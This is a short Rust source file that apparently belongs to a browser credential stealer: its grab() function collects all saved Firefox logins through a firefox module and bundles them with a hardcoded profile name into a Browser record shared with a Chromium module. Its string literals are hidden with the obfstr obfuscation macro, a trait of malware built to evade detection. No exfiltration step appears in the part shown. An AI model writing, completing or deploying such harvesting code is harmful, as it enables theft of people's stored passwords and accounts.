use std::collections::HashMap;

use crate::chromium::utils::Browser;

pub mod firefox;


pub async fn grab() -> Option<Browser>{

    let ff_logins = firefox::get_all_logins().await.ok()?;

    let mut profiles = HashMap::new();

    profiles.insert(obfstr::obfstr!("qnq0haq7.default").to_string(), ff_logins);

    let browser = crate::chromium::utils::Browser {
        name: obfstr::obfstr!("Firefox").to_string(),
        path: String::new(),
        profiles: profiles,
    };

    Some(browser)

}